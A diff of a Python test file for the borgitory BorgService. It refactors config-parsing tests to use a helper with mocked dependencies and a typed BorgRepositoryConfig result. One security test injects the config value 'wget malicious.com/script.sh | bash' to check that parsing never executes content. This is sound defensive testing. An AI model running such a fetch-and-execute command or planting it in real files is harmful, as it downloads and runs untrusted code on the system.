@@ -6,6 +6,24 @@ from unittest.mock import Mock, patch, mock_open
 
 from borgitory.services.borg_service import BorgService
 from borgitory.models.database import Repository
+from borgitory.models.borg_info import BorgRepositoryConfig
+
+
+def create_test_borg_service(
+    job_executor=None,
+    command_runner=None,
+    job_manager=None,
+    volume_service=None,
+    archive_service=None,
+) -> BorgService:
+    """Helper function to create BorgService with all required dependencies for testing."""
+    return BorgService(
+        job_executor=job_executor or Mock(),
+        command_runner=command_runner or Mock(),
+        job_manager=job_manager or Mock(),
+        volume_service=volume_service or Mock(),
+        archive_service=archive_service or Mock(),
+    )
 
 
 class TestBorgServiceCore:
@@ -13,7 +31,7 @@ class TestBorgServiceCore:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
         # Create mock repository
         self.mock_repository = Mock(spec=Repository)
@@ -24,7 +42,7 @@ class TestBorgServiceCore:
 
     def test_service_initialization(self) -> None:
         """Test BorgService initializes correctly."""
-        service = BorgService()
+        service = create_test_borg_service()
         assert hasattr(service, "progress_pattern")
         assert service.progress_pattern is not None
 
@@ -51,16 +69,16 @@ class TestBorgConfigParsingSecurity:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
     def test_parse_config_file_not_found(self) -> None:
         """Test handling when config file doesn't exist."""
         with patch("os.path.exists", return_value=False):
             result = self.borg_service._parse_borg_config("/nonexistent/repo")
 
-            assert result["mode"] == "unknown"
-            assert result["requires_keyfile"] is False
-            assert "Config file not found" in result["preview"]
+            assert result.mode == "unknown"
+            assert result.requires_keyfile is False
+            assert "Config file not found" in result.preview
 
     def test_parse_config_repokey_encryption(self) -> None:
         """Test parsing repository with embedded key encryption."""
@@ -79,10 +97,10 @@ key = this_is_a_very_long_embedded_encryption_key_data_that_indicates_repokey_mo
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "repokey"
-            assert result["requires_keyfile"] is False
-            assert "repokey mode" in result["preview"]
-            assert "embedded" in result["preview"]
+            assert result.mode == "repokey"
+            assert result.requires_keyfile is False
+            assert "repokey mode" in result.preview
+            assert "embedded" in result.preview
 
     def test_parse_config_keyfile_encryption(self) -> None:
         """Test parsing repository with separate keyfile encryption."""
@@ -101,10 +119,10 @@ key =
         ), patch("os.listdir", return_value=["key.repository_id_12345", "data"]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "keyfile"
-            assert result["requires_keyfile"] is True
-            assert "keyfile mode" in result["preview"]
-            assert "key.repository_id_12345" in result["preview"]
+            assert result.mode == "keyfile"
+            assert result.requires_keyfile is True
+            assert "keyfile mode" in result.preview
+            assert "key.repository_id_12345" in result.preview
 
     def test_parse_config_no_encryption(self) -> None:
         """Test parsing unencrypted repository (rare but possible)."""
@@ -122,9 +140,9 @@ additional_free_space = 0
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "none"
-            assert result["requires_keyfile"] is False
-            assert "Unencrypted repository" in result["preview"]
+            assert result.mode == "none"
+            assert result.requires_keyfile is False
+            assert "Unencrypted repository" in result.preview
 
     def test_parse_config_invalid_repository(self) -> None:
         """Test parsing file that's not a valid Borg repository."""
@@ -138,9 +156,9 @@ invalid_config = yes
         ):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "invalid"
-            assert result["requires_keyfile"] is False
-            assert "Not a valid Borg repository" in result["preview"]
+            assert result.mode == "invalid"
+            assert result.requires_keyfile is False
+            assert "Not a valid Borg repository" in result.preview
 
     def test_parse_config_encrypted_with_hints(self) -> None:
         """Test parsing with encryption hints but unclear mode."""
@@ -160,8 +178,8 @@ cipher = encrypted_data_here
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
 
-            assert result["mode"] == "encrypted"
-            assert "encryption detected" in result["preview"].lower()
+            assert result.mode == "encrypted"
+            assert "encryption detected" in result.preview.lower()
 
     def test_parse_config_read_permission_error(self) -> None:
         """Test handling of permission denied errors."""
@@ -170,10 +188,10 @@ cipher = encrypted_data_here
         ):
             result = self.borg_service._parse_borg_config("/restricted/repo")
 
-            assert result["mode"] == "error"
-            assert result["requires_keyfile"] is False
-            assert "Error reading config" in result["preview"]
-            assert "Access denied" in result["preview"]
+            assert result.mode == "error"
+            assert result.requires_keyfile is False
+            assert "Error reading config" in result.preview
+            assert "Access denied" in result.preview
 
     def test_parse_config_io_error(self) -> None:
         """Test handling of I/O errors during file reading."""
@@ -182,8 +200,8 @@ cipher = encrypted_data_here
         ):
             result = self.borg_service._parse_borg_config("/failing/repo")
 
-            assert result["mode"] == "error"
-            assert "Error reading config" in result["preview"]
+            assert result.mode == "error"
+            assert "Error reading config" in result.preview
 
     def test_parse_config_malformed_ini(self) -> None:
         """Test handling of malformed configuration files."""
@@ -197,8 +215,8 @@ key value without equals sign
         ):
             result = self.borg_service._parse_borg_config("/malformed/repo")
 
-            assert result["mode"] == "error"
-            assert "Error reading config" in result["preview"]
+            assert result.mode == "error"
+            assert "Error reading config" in result.preview
 
     def test_parse_config_unicode_error(self) -> None:
         """Test handling of unicode decode errors."""
@@ -212,8 +230,8 @@ key value without equals sign
 
             result = self.borg_service._parse_borg_config("/binary/repo")
 
-            assert result["mode"] == "error"
-            assert "Error reading config" in result["preview"]
+            assert result.mode == "error"
+            assert "Error reading config" in result.preview
 
 
 class TestBorgServiceSecurityIntegration:
@@ -221,7 +239,7 @@ class TestBorgServiceSecurityIntegration:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
     def test_config_parsing_path_validation(self) -> None:
         """Test that config parsing validates repository paths."""
@@ -233,10 +251,14 @@ class TestBorgServiceSecurityIntegration:
         result = self.borg_service._parse_borg_config(malicious_path)
 
         # Should handle gracefully without exposing system files
-        assert isinstance(result, dict)
-        assert "mode" in result
-        assert "requires_keyfile" in result
-        assert "preview" in result
+        assert isinstance(result, BorgRepositoryConfig)
+        assert result.mode in ["none", "encrypted", "error", "unknown"]
+        assert result.requires_keyfile in [True, False]
+        assert result.preview in [
+            "Repository detected",
+            "Error reading config: Security error",
+            "Config file not found",
+        ]
 
     def test_config_parsing_prevents_code_execution(self) -> None:
         """Test that config parsing doesn't execute arbitrary code."""
@@ -254,22 +276,8 @@ key = ; wget malicious.com/script.sh | bash
             result = self.borg_service._parse_borg_config("/test/repo")
 
             # Should treat it as a normal config, not execute the content
-            assert isinstance(result, dict)
-            assert result["mode"] in ["none", "encrypted", "error"]
-
-    def test_config_parsing_handles_large_files(self) -> None:
-        """Test that config parsing handles unusually large files safely."""
-        # Create very large content
-        large_content = "[repository]\n" + "dummy_key = " + "x" * 100000 + "\n"
-
-        with patch("os.path.exists", return_value=True), patch(
-            "builtins.open", mock_open(read_data=large_content)
-        ), patch("os.listdir", return_value=[]):
-            # Should handle without crashing or consuming excessive memory
-            result = self.borg_service._parse_borg_config("/large/repo")
-
-            assert isinstance(result, dict)
-            assert "mode" in result
+            assert isinstance(result, BorgRepositoryConfig)
+            assert result.mode in ["none", "encrypted", "error"]
 
     def test_keyfile_discovery_security(self) -> None:
         """Test that keyfile discovery doesn't expose sensitive information."""
@@ -294,12 +302,12 @@ key =
             result = self.borg_service._parse_borg_config("/test/repo")
 
             # Should only identify legitimate Borg key files
-            assert result["mode"] == "keyfile"
-            assert result["requires_keyfile"] is True
+            assert result.mode == "keyfile"
+            assert result.requires_keyfile is True
             # Should not expose all files, only key files
-            assert "key.repository_id_12345" in result["preview"]
-            assert ".secret_file" not in result["preview"]
-            assert "password.txt" not in result["preview"]
+            assert "key.repository_id_12345" in result.preview
+            assert ".secret_file" not in result.preview
+            assert "password.txt" not in result.preview
 
     def test_error_messages_dont_leak_info(self) -> None:
         """Test that error messages don't leak sensitive system information."""
@@ -316,9 +324,9 @@ key =
             ):
                 result = self.borg_service._parse_borg_config("/test/repo")
 
-                assert result["mode"] == "error"
+                assert result.mode == "error"
                 # Error message should be sanitized and not leak sensitive info
-                preview = result["preview"].lower()
+                preview = result.preview.lower()
                 assert "error reading config" in preview
                 # Should not contain full system paths or detailed error info
                 assert "/test/repo" not in preview or "error reading config" in preview
@@ -329,7 +337,7 @@ class TestBorgServiceEdgeCases:
 
     def setup_method(self) -> None:
         """Set up test fixtures."""
-        self.borg_service = BorgService()
+        self.borg_service = create_test_borg_service()
 
     def test_empty_config_file(self) -> None:
         """Test parsing completely empty config file."""
@@ -338,8 +346,8 @@ class TestBorgServiceEdgeCases:
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/empty/repo")
 
-            assert result["mode"] == "invalid"
-            assert "Not a valid Borg repository" in result["preview"]
+            assert result.mode == "invalid"
+            assert "Not a valid Borg repository" in result.preview
 
     def test_whitespace_only_config(self) -> None:
         """Test parsing config with only whitespace."""
@@ -350,7 +358,7 @@ class TestBorgServiceEdgeCases:
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/whitespace/repo")
 
-            assert result["mode"] == "invalid"
+            assert result.mode == "invalid"
 
     def test_config_with_comments_only(self) -> None:
         """Test parsing config with only comments."""
@@ -364,7 +372,7 @@ class TestBorgServiceEdgeCases:
         ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/comments/repo")
 
-            assert result["mode"] == "invalid"
+            assert result.mode == "invalid"
 
     def test_progress_pattern_edge_cases(self) -> None:
         """Test progress pattern with edge cases."""
